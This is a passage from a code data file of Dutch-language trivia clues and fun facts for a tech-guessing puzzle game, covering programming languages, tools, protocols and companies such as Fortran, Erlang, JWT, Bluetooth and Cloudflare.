      'De meeste desktops, laptops en servers draaiden er decennialang op.',
      'De processorarchitectuur genoemd naar de laatste twee cijfers van Intels vroege chips.'
    ],
    funFact: 'Intels eigen 64-bitsontwerp, Itanium, flopte, dus Intel nam uiteindelijk de 64-bitsversie van AMD over.'
  },
  173: {
    clues: [
      'Een team bij IBM onder leiding van John Backus leverde het in 1957 op voor de IBM 704.',
      'Het wordt vaak de eerste veelgebruikte hogere programmeertaal genoemd.',
      'In de oude vaste vorm stonden labels in kolom 1 tot 5 en gaf kolom 6 aan dat een regel doorliep.',
      'Weer- en klimaatmodellen en benchmarks voor supercomputers gebruiken het nog steeds.',
      'De nieuwste standaard kwam in 2023 uit, en het wordt nog steeds voor rekenwerk gebruikt.',
      'De FORmula TRANslation-taal.'
    ],
    funFact:
      "John Backus zei ooit dat veel van zijn werk voortkwam uit luiheid: hij hield niet van programma's schrijven, dus bouwde hij een manier om dat sneller te doen."
  },
  174: {
    clues: [
      'Ian Bicking maakte het in 2008 als vervanger van easy_install.',
      'De naam is een recursieve afkorting.',
      'Het installeert packages uit de Python Package Index.',
      'Dependencies worden vaak opgesomd in requirements.txt.',
      'Nieuwere tools zoals uv en Poetry concurreren ermee.',
      'De standaard pakketinstaller van Python, met een naam van drie letters.'
    ],
    funFact: "De naam staat voor 'pip installs packages'."
  },
  175: {
    clues: [
      'Het werd in 1986 gemaakt bij een Zweeds telefoonbedrijf.',
      'Het was bedoeld voor telefooncentrales die nooit plat mogen gaan.',
      "De filosofie is 'let it crash' en laat een supervisor het proces herstarten.",
      'Het draait op de virtuele machine BEAM en heeft een framework dat OTP heet.',
      'De servers van WhatsApp en de taal Elixir bouwen er allebei op.',
      'De concurrente taal van Ericsson, genoemd naar een Deense wiskundige.'
    ],
    funFact: "De naam eert Agner Krarup Erlang, een pionier van de theorie van telefoonverkeer, en leest toevallig ook als 'Ericsson Language'."
  },
  176: {
    clues: [
      'Atlassian bracht het in 2002 uit.',
      'De naam is een ingekorte vorm van de Japanse naam voor Godzilla.',
      'Het was een steek naar de belangrijkste opensource-concurrent, waarvan de naam ook op -zilla eindigt.',
      'Tickets, epics, sprints en story points staan er allemaal in.',
      'Ontwikkelaars klagen er graag over, maar toch gebruiken de meeste teams het.',
      'De issuetracker van Atlassian.'
    ],
    funFact: 'De naam komt van Gojira, Japans voor Godzilla, als speelse knipoog naar concurrent Bugzilla.'
  },
  177: {
    clues: [
      'John Kemeny en Thomas Kurtz maakten het in 1964 aan Dartmouth College.',
      'Het was bedoeld zodat ook studenten buiten de exacte vakken een timesharingcomputer konden gebruiken.',
      "Programma's hadden traditioneel regelnummers, zoals 10 PRINT en 20 GOTO 10.",
      'Thuiscomputers uit de jaren 80 startten er direct in op.',
      'Het allereerste product van Microsoft was er een interpreter voor.',
      "De Beginner's All-purpose Symbolic Instruction Code."
    ],
    funFact: 'Bill Gates en Paul Allen schreven hun interpreter voor de Altair 8800 in 1975 zonder de machine zelf ooit gezien te hebben.'
  },
  178: {
    clues: [
      'Het bedrijf erachter begon als een GraphQL-backenddienst die Graphcool heette.',
      'Je beschrijft je datamodel in één schemabestand met een eigen kleine taal.',
      'Het genereert een volledig getypeerde client, dus queries worden door TypeScript gecontroleerd.',
      'Het migrate-commando maakt van schemawijzigingen SQL-migraties.',
      "Het is een van de populairste ORM's voor Node.js.",
      'De TypeScript-ORM met een naam die lijkt op het glazen voorwerp dat licht splitst.'
    ],
    funFact: 'In 2025 begon het de query-engine in Rust te vervangen door een in TypeScript.'
  },
  179: {
    clues: [
      'De Nederlandse ingenieur Jaap Haartsen ontwikkelde het vanaf 1994 bij Ericsson in Zweden.',
      'Het moest de kabels tussen telefoons en headsets vervangen.',
      'Het springt tussen frequenties in de 2,4GHz-band.',
      'Het logo combineert twee Noordse runen.',
      'De naam komt van een Deense koning uit de tiende eeuw die stammen verenigde.',
      'De draadloze standaard voor korte afstand, genoemd naar de blauwe tand van koning Harald.'
    ],
    funFact: 'Het logo combineert de runen voor H en B, de initialen van Harald Blauwtand, de Deense koning naar wie het is genoemd.'
  },
  180: {
    clues: [
      'Een groep webmasters begon ermee in 1995 door patches voor de NCSA-webserver te verzamelen.',
      "Volgens een populair maar omstreden verhaal is de naam een woordgrap op 'a patchy server'.",
      "De configuratiebestanden per map beginnen met een punt en laten je URL's herschrijven.",
      "Het was zo'n twintig jaar de meestgebruikte webserver ter wereld.",
      'Het is de A in de LAMP-stack, en er groeide een foundation omheen.',
      'De webserver van de Apache Software Foundation.'
    ],
    funFact: 'De Apache Software Foundation, nu de thuisbasis van honderden projecten, werd in 1999 opgericht om deze ene server te ondersteunen.'
  },
  181: {
    clues: [
      'TJ Holowaychuk bracht het in 2010 uit, geïnspireerd door Sinatra van Ruby.',
      'Het hele ontwerp draait om middlewarefuncties die next() aanroepen.',
      "Routes zien eruit als app.get('/', (req, res) => ...).",
      'Het is de E in de MEAN- en MERN-stack.',
      "Versie 5 werd in 2024 eindelijk stabiel, zo'n tien jaar na de eerste alpha.",
      'Het minimale webframework voor Node.js met een Engelse naam die ook snel betekent.'
    ],
    funFact: 'Het wordt nu onderhouden onder de OpenJS Foundation, lang nadat de oorspronkelijke auteur naar andere talen overstapte.'
  },
  182: {
    clues: [
      'De standaard werd in 1992 gepubliceerd, door een commissie waarnaar het is genoemd.',
      'Het deelt een afbeelding op in blokken van 8x8 en past een discrete cosinustransformatie toe.',
      'Het gooit details weg die je ogen waarschijnlijk niet missen.',
      "Sla het te vaak op en je krijgt blokkerige 'artefacten'.",
      'De gebruikelijke extensie heeft maar drie letters, vanwege oude beperkingen in DOS.',
      'Het fotoformaat van de Joint Photographic Experts Group.'
    ],
    funFact: 'Bestanden eindigen vaak op .jpg in plaats van de volledige naam, omdat MS-DOS maar extensies van drie letters toestond.'
  },
  183: {
    clues: [
      'Masahiro Hara vond het uit bij Denso Wave, een toeleverancier van Toyota, in 1994.',
      'Het was bedoeld om auto-onderdelen in fabrieken te volgen.',
      'Het ontwerp werd geïnspireerd door de zwarte en witte stenen van het bordspel go.',
      'Door foutcorrectie is het nog leesbaar als tot 30% beschadigd is.',
      "Het maakte een grote comeback met restaurantmenu's tijdens de pandemie.",
      'De vierkante tweedimensionale streepjescode, kort voor Quick Response.'
    ],
    funFact: 'Denso Wave heeft het patent, maar koos ervoor het niet af te dwingen; daarom mag iedereen het gratis gebruiken.'
  },
  184: {
    clues: [
      'Rashid Khan begon eraan rond 2013, en het werd onderdeel van Elastic.',
      'Het visualiseert data die in Elasticsearch staat.',
      'In de Discover-weergave doorzoek en filter je logregels.',
      'Grafana begon als fork van de derde versie.',
      'Het is de K in de ELK-stack.',
      'De dashboard- en visualisatietool van Elastic, met een naam die met K begint.'
    ],
    funFact: 'De ELK-stack staat voor Elasticsearch, Logstash en deze tool.'
  },
  185: {
    clues: [
      'RFC 7519 legde het vast in 2015.',
      'Het bestaat uit drie base64url-delen, gescheiden door punten.',
      'Die delen zijn een header, een payload met claims en een handtekening.',
      'Claims als exp, sub en iat zeggen voor wie het is en wanneer het verloopt.',
      "De specificatie zegt dat je het uitspreekt als het Engelse woord 'jot'.",
      'Het JSON Web Token.'
    ],
    funFact: "Vroege libraries accepteerden tokens met het algoritme op 'none', waardoor aanvallers de handtekening gewoon konden overslaan."
  },
  186: {
    clues: [
      'Niklaus Wirth ontwierp het rond 1970 om gestructureerd programmeren te leren.',
      'Blokken staan tussen begin en end, en toekenning schrijf je als :=.',
      'Een goedkope en razendsnelle compiler van Borland maakte het in de jaren 80 enorm populair.',
      'Delphi is de objectgeoriënteerde opvolger.',
      'Het was jarenlang de standaardtaal in het onderwijs op veel universiteiten.',
      'De taal genoemd naar de Franse wiskundige die een mechanische rekenmachine bouwde.'
    ],
    funFact: 'Turbo Pascal werd geschreven door Anders Hejlsberg, die later C# en TypeScript ontwierp.'
  },
  187: {
    clues: [
      'Hans Dockter begon er rond 2008 aan.',
      'De buildscripts zijn code, geschreven in Groovy of Kotlin in plaats van XML.',
      'Projecten leveren een klein wrapperscript mee, zodat iedereen dezelfde versie gebruikt.',
      'De buildcache en daemon maken herhaalde builds snel.',
      'Het is sinds 2013 het officiële buildsysteem voor Android-apps.',
      'De JVM-buildtool met bestanden die build.gradle heten.'
    ],
    funFact: 'Door het wrapperscript gradlew kun je een project bouwen zonder de tool zelf te installeren.'
  },
  188: {
    clues: [
      "Bij de lancering in 2007 had het geen eigen naam; Apple zei gewoon dat de telefoon 'OS X' draaide.",
      'De App Store opende een jaar later, in 2008.',
      'In 2010 kreeg het de huidige naam, die Apple in licentie nam van Cisco.',
      'Apps worden geschreven in Swift of Objective-C.',
      'Het draait op elke iPhone.',
      'Het mobiele besturingssysteem van Apple, met een naam van drie letters die met een kleine i begint.'
    ],
    funFact: 'Cisco gebruikte de naam al voor zijn routersoftware, dus Apple moest er een licentie voor nemen.'
  },
  189: {
    clues: [
      'Vladimir Agafonkin uit Kyiv bracht het in 2011 uit.',
      'Het weegt maar ongeveer 40 kB.',
      'Het toont meestal tegels van OpenStreetMap.',
      "Alles begint met L.map('map').setView(...).",
      'Het is de populairste opensourcelibrary voor interactieve kaarten.',
      'De JavaScript-kaartlibrary met een groen blaadje als logo.'
    ],
    funFact: 'De maker schreef ook veel kleine, snelle geometrielibraries die overal in de wereld van webkaarten worden gebruikt.'
  },
  190: {
    clues: [
      'Microsoft bundelde in 1997 voor het eerst zijn ontwikkeltools onder deze naam.',
      'Projecten worden gegroepeerd in solution-bestanden die op .sln eindigen.',
      'Het liet veel ontwikkelaars kennismaken met code-aanvulling via IntelliSense.',
      'Er is een gratis Community-editie, en de Mac-versie werd in 2024 stopgezet.',
      'Het is de zware IDE voor C#, C++ en .NET op Windows.',
      'De volledige IDE van Microsoft, de grote broer van VS Code.'
    ],
    funFact: 'Ondanks de vergelijkbare namen delen het en VS Code weinig code: de een is een native Windows-IDE, de ander een Electron-app.'
  },
  191: {
    clues: [
      'Jon Postel legde het vast in RFC 821, in 1982.',
      'Een sessie begint met HELO, of EHLO in de uitgebreide vorm.',
      "MAIL FROM, RCPT TO en DATA zijn enkele van de commando's.",
      'Een bericht eindigt met een regel met alleen een punt.',
      'Zo wordt e-mail van server naar server verstuurd.',
      'Het Simple Mail Transfer Protocol.'
    ],
    funFact: 'Omdat er oorspronkelijk geen authenticatie was, kon iedereen zich als iedereen voordoen; daarom kwamen later SPF, DKIM en DMARC.'
  },
  192: {
    clues: [
      'CollabNet begon eraan in 2000.',
      "Het doel was 'CVS done right'.",
      'Het is centraal: elke commit krijgt het volgende wereldwijde revisienummer.',
      'Repositories hebben traditioneel de mappen trunk, branches en tags.',
      'Git verving het bijna overal, maar het leeft voort als Apache-project.',
      'Het versiebeheersysteem met het commando svn.'
    ],
    funFact: 'De naam heeft een dubbele betekenis: het beheert versies, en het wilde CVS omverwerpen.'
  },
  193: {
    clues: [
      'Het groeide uit een prototype van Alan Cooper dat Microsoft kocht en de codenaam Ruby gaf.',
      'Het verscheen in 1991 en liet je eerst een venster tekenen en pas daarna code toevoegen.',
      "'On Error Resume Next' is een van de beruchtste regels.",
      'De zesde versie, uit 1998, was enorm populair voor bedrijfsapplicaties.',
      "Een variant ervan draait nog steeds macro's in Microsoft Office.",
      'De sleep-en-neerzet-afstammeling van de beginnerstaal van Dartmouth, van Microsoft.'
    ],
    funFact: 'Alan Cooper wordt vaak de vader ervan genoemd, al combineerde Microsoft zijn visuele ontwerper met zijn eigen taal QuickBASIC.'
  },
  194: {
    clues: [
      'Het werd in 2018 aangekondigd en was vanaf november 2019 voor iedereen beschikbaar.',
      'De workflows zijn YAML-bestanden in een verborgen map in de root van de repository.',
      "Stappen hergebruiken bouwblokken van de community met een regel 'uses:', zoals checkout@v4.",
      'Jobs draaien op gehoste runners met Ubuntu, Windows of macOS, of op je eigen machines.',
      'De tests en deployments van Codeguessr zelf draaien erop.',
      'De CI/CD-dienst die in GitHub is ingebouwd.'
    ],
    funFact: 'De marketplace biedt tienduizenden herbruikbare actions, van linten tot berichten in Slack.'
  },
  195: {
    clues: [
      'Het begon in 2013 als intern hackathonproject bij Facebook.',
      "Het motto was 'learn once, write anywhere', niet 'write once, run anywhere'.",
      'Componenten worden echte platformweergaven in plaats van in een webview te renderen.',
      "De nieuwe architectuur verving 'de bridge' door JSI, Fabric en TurboModules.",
      'Expo is de populairste manier om er een project mee te starten.',
      'Het framework van Meta om iOS- en Android-apps te bouwen met React.'
    ],
    funFact: 'Ads Manager van Facebook was de eerste Android-app die volledig met dit framework werd gebouwd.'
  },
  196: {
    clues: [
      'Evan Wallace bracht het in 2020 uit.',
      'De maker is ook medeoprichter van de ontwerptool Figma.',
      'Het is geschreven in Go en gebruikt elke CPU-kern.',
      'Het is 10 tot 100 keer sneller dan de bundlers die ervoor kwamen.',
      'Vite gebruikte het om dependencies vooraf te bundelen tijdens de ontwikkeling.',
      "De extreem snelle JavaScript-bundler, met een naam in kleine letters die met 'es' begint."
    ],
    funFact: 'De benchmark op de homepage laat het een groot project bundelen in ruim onder een seconde, terwijl oudere tools bijna een minuut nodig hebben.'
  },
  197: {
    clues: [
      'Het verscheen in 2021, van het team achter de buildtool Snowpack.',
      "Het maakte de 'islands'-architectuur populair.",
      'Standaard stuurt het nul JavaScript naar de browser.',
      'Componenten hebben bovenaan een frontmatter-script tussen drie streepjes.',
      'Je kunt React-, Vue- en Svelte-componenten op dezelfde pagina mengen.',
      'Het contentgerichte webframework met een naam die Grieks is voor ster.'
    ],
    funFact: 'Het team stopte met de ontwikkeling van Snowpack om zich op dit framework te richten.'
  },
  198: {
    clues: [
      'Juan Linietsky en Ariel Manzur uit Argentinië maakten het in 2014 open source.',
      "Het valt onder de MIT-licentie, zonder enige royalty's.",
      'Games worden gebouwd uit scenes die uit nodes bestaan.',
      'De eigen scripttaal, GDScript, lijkt op Python.',
      'Veel ontwikkelaars stapten erop over na de prijsophef rond Unity in 2023.',
      'De opensource game-engine genoemd naar een toneelstuk waarin iemand nooit komt opdagen.'
    ],
    funFact: 'Het is genoemd naar het toneelstuk Wachten op Godot van Samuel Beckett, een grap over een game-engine die nooit helemaal af is.'
  },
  199: {
    clues: [
      'Gary Bradski begon eraan bij Intel in 1999.',
      'Versie 1.0 kwam in 2006, en later steunde robotlab Willow Garage het.',
      'Het slaat kleurenafbeeldingen standaard op in BGR-volgorde, niet RGB.',
      'In Python importeer je het als cv2.',
      'Gezichtsdetectie, randdetectie en camerakalibratie zijn klassieke toepassingen.',
      'De opensourcelibrary voor computer vision.'
    ],
    funFact: 'De standaard BGR-volgorde stamt uit camera- en schermconventies die gebruikelijk waren toen het werd geschreven.'
  },
  200: {
    clues: [
      'Drie onderzoekers van Bell Labs maakten het in 1977.',
      "Programma's zijn een lijst patronen, elk gevolgd door een actie tussen accolades.",
      'Het splitst elke regel in velden die je aanspreekt als $1, $2 enzovoort.',
      'NR bevat het huidige regelnummer en NF het aantal velden.',
      'De GNU-versie zet één letter voor de naam.',
      'De Unix-taal voor tekstverwerking, genoemd naar de initialen van Aho, Weinberger en Kernighan.'
    ],
    funFact: 'De K in de naam is Brian Kernighan, die ook de K is in K&R, het klassieke boek over de taal C.'
  },
  201: {
    clues: [
      'Yonik Seeley maakte het bij CNET Networks in 2004.',
      'Het werd in 2006 aan Apache geschonken.',
      'Het is gebouwd op de zoeklibrary Lucene.',
      'Het staat bekend om faceted search, de filters met aantallen op webwinkels.',
      'Het is de oudere opensourceconcurrent van Elasticsearch.',
      "Het zoekplatform van Apache met een naam die je uitspreekt als 'solar'."
    ],
    funFact: 'Zowel het als grote concurrent Elasticsearch gebruiken onder de motorkap Lucene, de Java-zoeklibrary van Doug Cutting.'
  },
  202: {
    clues: [
      'Het werd aangekondigd op WWDC in 2019.',
      'Views zijn lichte structs met een berekende property die body heet.',
      'Property wrappers als @State en @Binding sturen updates aan.',
      'Xcode toont live previews van je views terwijl je typt.',
      'Het is de declaratieve opvolger van UIKit en AppKit.',
      'Het UI-framework van Apple, genoemd naar zijn taal plus twee letters.'
    ],
    funFact: 'Dezelfde code kan draaien op iPhone, iPad, Mac, Apple Watch, Apple TV en Vision Pro.'
  },
  203: {
    clues: [
      'François Chollet bracht het in 2015 uit.',
      'De naam is Grieks voor hoorn, een verwijzing naar een passage in de Odyssee.',
      'Een Sequential-model stapelt lagen als bouwblokken.',
      'Het werd de officiële high-level API van TensorFlow.',
      'Versie 3 kan draaien op JAX, TensorFlow of PyTorch.',
      'De gebruiksvriendelijke deep-learning-API van François Chollet.'
    ],
    funFact: 'De naam verwijst naar de Odyssee, waar dromen die uitkomen door een poort van hoorn gaan, en valse dromen door een poort van ivoor.'
  },
  204: {
    clues: [
      'Gavin King begon eraan in 2001.',
      'Het koppelt Java-klassen aan databasetabellen.',
      'De querytaal, HQL, lijkt op SQL maar praat over objecten.',
      'De standaard Java Persistence API werd er sterk door beïnvloed.',
      'Red Hat nam de ontwikkeling over via JBoss.',
      'De Java-ORM met een Engelse naam voor wat beren in de winter doen.'
    ],
    funFact: 'Gavin King ontwierp later een eigen JVM-taal, Ceylon.'
  },
  205: {
    clues: [
      'Google maakte het in 2011 open source, na de overname van een bedrijf dat Global IP Solutions heette.',
      'Twee browsers kunnen hiermee direct audio, video en data naar elkaar sturen.',
      'ICE, STUN en TURN helpen het door firewalls en NAT heen.',
      'getUserMedia vraagt om de camera, en RTCPeerConnection zet het gesprek op.',
      'Google Meet en veel andere video-apps draaien erop.',
      'Web Real-Time Communication.'
    ],
    funFact: 'Het werd in 2021 een officiële W3C- en IETF-standaard, tien jaar na de eerste release.'
  },
  206: {
    clues: [
      'Richard Stallman bracht de eerste versie uit in 1987.',
      'Het stond eerst voor GNU C Compiler, voordat het veel meer talen ondersteunde.',
      'Een fork uit 1997, EGCS, werd zo goed dat die in 1999 het origineel verving.',
      'Opties als -O2, -Wall en -g zijn dagelijkse kost.',
      'De Linux-kernel is het grootste deel van zijn geschiedenis ermee gebouwd.',
      'De GNU Compiler Collection.'
    ],
    funFact: 'De fork EGCS was zo succesvol dat het project hem in 1999 als officiële versie overnam.'
  },
  207: {
    clues: [
      'Alexis Sellier bracht het in 2009 uit.',
      'De eerste versie was in Ruby geschreven, en daarna in JavaScript herschreven.',
      'Variabelen beginnen met @ in plaats van $.',
      'Bootstrap 3 was ermee gebouwd, voordat het in versie 4 naar de concurrent overstapte.',
      'Het is een CSS-preprocessor die zelfs in de browser kan draaien.',
      'De CSS-preprocessor met een Engelse naam die het tegenovergestelde van meer betekent.'
    ],
    funFact: "De naam is later uitgelegd als 'Leaner Style Sheets'."
  },
  208: {
    clues: [
      'Steve Francia begon eraan in 2013, en Bjørn Erik Pedersen werd later de hoofdontwikkelaar.',
      "Het bouwt duizenden pagina's in een paar seconden, als één binary.",
      'Het gebruikt de templatetaal van Go, met shortcodes in Markdown.',
      'Content staat in Markdown-bestanden met front matter bovenaan.',
      'Het is een van de populairste statische sitegenerators.',
      'De statische sitegenerator geschreven in Go, met een jongensnaam.'
    ],
    funFact: 'Steve Francia maakte ook de Go-libraries Cobra en Viper, die in veel commandlinetools zitten.'
  },
  209: {
    clues: [
      'Twee Nederlandse informatici, Dijkstra en Van Wijngaarden, zorgden dat ALGOL 60 het ondersteunde.',
      'Elk correct gebruik heeft een basisgeval nodig.',
      'Vergeet je dat, dan krijg je een stack overflow.',
      "Zoek het op Google en je krijgt de vraag: 'Bedoelde je' hetzelfde woord nog eens.",
      'De klassieke voorbeelden zijn faculteit en Fibonacci.',
      'Wanneer een functie zichzelf aanroept.'
    ],
    funFact: "Dat het op het laatste moment in ALGOL 60 terechtkwam, wordt soms het 'Amsterdam plot' genoemd."
  },
  210: {
    clues: [
      'Het werd in 2014 afgesplitst van het IPython-project.',
      'De naam combineert drie talen die het vanaf het begin ondersteunde.',
      'Het knipoogt ook naar de notitieboeken van Galileo over de manen van een planeet.',
      'Documenten mengen code, uitvoer, grafieken en tekst in cellen.',
      'De bestanden eindigen op .ipynb.',
      'De notebookomgeving waar datawetenschappers dol op zijn.'
    ],
    funFact: 'De naam is opgebouwd uit Julia, Python en R.'
  },
  211: {
    clues: [
      'De wortels liggen deels in Nieuwegein, waar NCR-ingenieurs vroege draadloze netwerkproducten bouwden.',
      'De Nederlandse ingenieur Vic Hayes was voorzitter van de IEEE 802.11-commissie en wordt de vader ervan genoemd.',
      'De eerste standaard kwam uit in 1997.',
      'Een merkbureau bedacht de naam in 1999; het staat nergens voor.',
      'Sinds 2018 hebben de generaties simpele nummers, zoals 6 en 7.',
      'Draadloos netwerken, met een merknaam met een streepje.'
    ],
    funFact: "Anders dan vaak wordt gedacht, is de naam geen afkorting van 'wireless fidelity'; het merkbureau Interbrand heeft hem bedacht."
  },
  212: {
    clues: [
      'Het verscheen in de jaren 70 in Unix, en de versie van Paul Vixie uit 1987 werd de gangbare.',
      'De naam komt van het Griekse woord voor tijd.',
      'Elke regel heeft vijf tijdvelden: minuut, uur, dag van de maand, maand en dag van de week.',
      "Vijf sterretjes betekenen 'elke minuut'.",
      'Je bewerkt je planning met crontab -e.',
      'De taakplanner van Unix.'
    ],
    funFact: 'De syntax met vijf velden is zo wijdverbreid dat GitHub Actions, Kubernetes en de meeste cloudplanners hem hergebruiken.'
  },
  213: {
    clues: [
      'Jeff Atwood en Joel Spolsky lanceerden het in 2008.',
      'Lezers van Atwoods blog stemden over de naam.',
      'Reputatiepunten en badges belonen nuttige antwoorden.',
      "'Closed as duplicate' werd de beruchtste zin.",
      'Het verkeer daalde flink nadat AI-chatbots kwamen.',
      'De vraag-en-antwoordsite voor programmeurs, genoemd naar een geheugenfout.'
    ],
    funFact: 'De naam werd gekozen in een peiling onder lezers van Jeff Atwoods blog Coding Horror.'
  },
  214: {
    clues: [
      'Het begon als promotieonderzoek van Eelco Dolstra aan de Universiteit Utrecht.',
      'Het noemt zichzelf een puur functionele pakketbeheerder.',
      'Elk pakket staat in een store, onder een pad met een hash van al zijn inputs.',
      'Er is een complete Linux-distributie op gebouwd, en flakes zetten elke input vast.',
      'Het belooft reproduceerbare builds en rollbacks voor je hele systeem.',
      "De pakketbeheerder met een naam van drie letters die klinkt als 'niks'."
    ],
    funFact: 'Het komt uit Nederland: het proefschrift van Eelco Dolstra uit 2006 aan de Universiteit Utrecht legde de basis.'
  },
  215: {
    clues: [
      'De term kwam oorspronkelijk uit de elektronica, waar signalen strijden om als eerste bij een poort te zijn.',
      'Het droeg bij aan dodelijke overdoses straling door de Therac-25-machine in de jaren 80.',
      "Zo'n bug in een alarmsysteem droeg bij aan de grote stroomuitval in Noord-Amerika in 2003.",
      'De uitkomst hangt af van de onvoorspelbare timing van threads.',
      'Locks en atomaire bewerkingen voorkomen het.',
      'De bug waarbij het resultaat afhangt van welke thread er het eerst is.'
    ],
    funFact: 'Zulke bugs verdwijnen vaak als je logging of een debugger toevoegt, omdat dat de timing verandert.'
  },
  216: {
    clues: [
      'David Cramer begon eraan in 2008 als kleine logging-plug-in voor Django.',
      'Het groepeert identieke exceptions en laat zien hoe vaak ze voorkomen.',
      'Het toont de volledige stacktrace, de release en de gebruiker die de fout tegenkwam.',
      "Er zijn SDK's voor bijna elke taal en elk framework.",
      'Het is een van de populairste diensten voor het bijhouden van fouten.',
      'De tool voor foutmonitoring met een Engelse naam voor een wachtpost.'
    ],
    funFact: 'In 2023 bedacht het een eigen licentie, de Functional Source License, die na twee jaar overgaat in een opensourcelicentie.'
  },
  217: {
    clues: [
      'Het werd in de jaren 70 bij Xerox PARC ontwikkeld door Alan Kay, Dan Ingalls, Adele Goldberg en anderen.',
      'Alles is er een object, en al het rekenwerk gebeurt door berichten te sturen.',
      'Je werkt in een levend image en past het draaiende systeem aan terwijl je bezig bent.',
      'Ruby en Objective-C leenden er allebei veel van.',
      'De versie van 1980 was de eerste die breed buiten het lab werd uitgebracht.',
      'De objectgeoriënteerde pionier met een Engelse naam die ook koetjes en kalfjes betekent.'
    ],
    funFact: 'Het Model-View-Controller-patroon werd in 1979 voor het eerst beschreven door Trygve Reenskaug, toen hij bij Xerox PARC met deze taal werkte.'
  },
  218: {
    clues: [
      'Emile Vauge begon eraan in Frankrijk in 2015.',
      'Het is een reverse proxy geschreven in Go.',
      'Het ontdekt zelf services via Docker-labels of Kubernetes-resources.',
      "Het haalt automatisch TLS-certificaten bij Let's Encrypt.",
      'Het bedrijf erachter heette Containous, totdat het zich naar het product vernoemde.',
      "De cloud-native reverse proxy met een naam die je uitspreekt als 'traffic'."
    ],
    funFact: "De ongewone spelling spreek je precies uit als het Engelse woord 'traffic'."
  },
  219: {
    clues: [
      'Brad Fitzpatrick schreef het in 2003 voor de blogsite LiveJournal.',
      'Het houdt alles in het RAM en vergeet het bij een herstart.',
      'Als het geheugen vol is, gooit het de minst recent gebruikte items weg.',
      'Facebook draaide een van de grootste installaties ter wereld.',
      'Het is een gedistribueerde key-valuecache in het geheugen.',
      "De cachingdaemon met een naam die op een 'd' eindigt."
    ],
    funFact: 'De auteur, die ook LiveJournal maakte, ging later naar Google en werkte in het Go-team.'
  },
  220: {
    clues: [
      'Twee Deense oprichters, Mathias Biilmann en Christian Bach, begonnen het in San Francisco in 2014.',
      "De CEO bedacht de term 'Jamstack'.",
      'Je kon een site deployen door een map op de webpagina te slepen.',
      'Elke pull request krijgt een deploy preview.',
      'Het kocht in 2023 het bedrijf achter Gatsby.',
      'Het hostingplatform met een blauwgroen logo, een grote concurrent van Vercel.'
    ],
    funFact: "Medeoprichter Mathias Biilmann bedacht 'Jamstack', kort voor JavaScript, API's en Markup."
  },
  221: {
    clues: [
      'Sebastian McKenzie begon er in 2014 aan onder een naam die precies zei wat het deed: 6to5.',
      'Het werd in 2015 hernoemd, omdat het veel meer kon dan één versie naar een andere omzetten.',
      'Het maakt van moderne JavaScript code die oudere browsers begrijpen.',
      'De preset-env kiest transformaties op basis van de browsers die je ondersteunt.',
      'Ook JSX en TypeScript kunnen ermee worden weggehaald.',
      'De JavaScript-compiler genoemd naar een bijbelse toren vol spraakverwarring.'
    ],
    funFact: 'De naam verwijst naar de Toren van Babel, waar mensen ineens talen spraken die niemand anders begreep.'
  },
  222: {
    clues: [
      'Het Chrome DevTools-team van Google bracht het in 2017 uit.',
      'Het bestuurt een browser via het DevTools Protocol.',
      'Het maakte headless Chrome makkelijk te scripten vanuit Node.js.',
      'Aanroepen als page.goto() en page.screenshot() zijn de basis.',
      'De oorspronkelijke auteurs gingen later naar Microsoft en bouwden Playwright.',
      'De Node.js-library om Chrome te besturen, genoemd naar iemand die een marionet bespeelt.'
    ],
    funFact: "Het wordt veel gebruikt om pdf's en screenshots van webpagina's te maken, niet alleen om te testen."
  },
  223: {
    clues: [
      'Bob Metcalfe en David Boggs ontwikkelden het bij Xerox PARC in 1973.',
      "De naam verwijst naar de 'lichtether', waarvan men ooit dacht dat die licht droeg.",
      'Het werd gestandaardiseerd als IEEE 802.3.',
      'Vroege versies deelden één kabel en detecteerden botsingen.',
      'Tegenwoordig sluit je het aan met een RJ45-stekker.',
      'De standaard voor bekabelde lokale netwerken.'
    ],
    funFact: 'Bob Metcalfe kreeg in 2022 de Turing Award voor de uitvinding ervan.'
  },
  224: {
    clues: [
      'Het Amerikaanse ministerie van Defensie liet het maken om honderden talen in zijn systemen te vervangen.',
      'Een team onder leiding van Jean Ichbiah won rond 1979 de ontwerpwedstrijd.',
      'Het is sterk getypeerd en populair in luchtvaart, spoor en andere veiligheidskritische systemen.',
      'Een subset die SPARK heet, kan formeel correct bewezen worden.',
      'Het militaire standaardnummer, MIL-STD-1815, is een geboortejaar.',
      'De taal genoemd naar de dochter van Lord Byron, vaak de eerste programmeur genoemd.'
    ],
    funFact: 'Het standaardnummer 1815 is het geboortejaar van Ada Lovelace.'
  },
  225: {
    clues: [
      'Apple bracht het in 2003 uit als opvolger van Project Builder van NeXT.',
      'Interface Builder gaat terug tot NeXT in de jaren 80.',
      'De app Instruments profileert geheugen, CPU en energieverbruik.',
      'Er zitten simulators in voor iPhone, iPad, Apple Watch en meer.',
      'Je hebt het, en een Mac, nodig om een app in de App Store te zetten.',
      'De IDE van Apple om apps voor zijn platforms te bouwen.'
    ],
    funFact: 'Interface Builder, er nog steeds onderdeel van, werd in 1988 gemaakt voor de NeXT-computer.'
  },
  226: {
    clues: [
      'Paul Copplestone en Ant Wilson richtten het in 2020 op.',
      'Het noemde zichzelf eerst een opensource-alternatief voor Firebase.',
      'Elk project is een volledige Postgres-database.',
      "Row Level Security-policy's bepalen wie elke rij mag lezen en schrijven.",
      'Codeguessr bewaart er de puzzels en spelersstatistieken in.',
      'Het opensource backendplatform op basis van Postgres, met een groene bliksemschicht als logo.'
    ],
    funFact: 'De puzzel die je nu speelt, werd er hoogstwaarschijnlijk uit geladen.'
  },
  227: {
    clues: [
      'Een talk van Philip Roberts op JSConf EU in 2014 die het uitlegt, heeft miljoenen views.',
      'Eén thread kan hierdoor veel dingen afhandelen door nooit te blokkeren.',
      'Callbacks van promises, als microtasks, draaien vóór de volgende setTimeout-callback.',
      'In Node.js wordt het geïmplementeerd door libuv.',
      'setTimeout(fn, 0) draait hierdoor niet direct.',
      'Het mechanisme dat de callbacks in de wachtrij van JavaScript een voor een uitvoert.'
    ],
    funFact: "De talk van Philip Roberts heette 'What the heck is the event loop anyway?'."
  },
  228: {
    clues: [
      'Matthew Prince, Lee Holloway en Michelle Zatlyn richtten het op, en het werd in 2010 gelanceerd.',
      'Een muur met lavalampen in het kantoor in San Francisco helpt willekeurige getallen te maken.',
      'De publieke DNS-resolver heeft het adres 1.1.1.1.',
      'De Workers draaien JavaScript aan de edge, in honderden steden.',
      'Een groot deel van alle websites zit achter het netwerk en de DDoS-bescherming.',
      'Het CDN- en beveiligingsbedrijf met een oranje wolk als logo.'
    ],
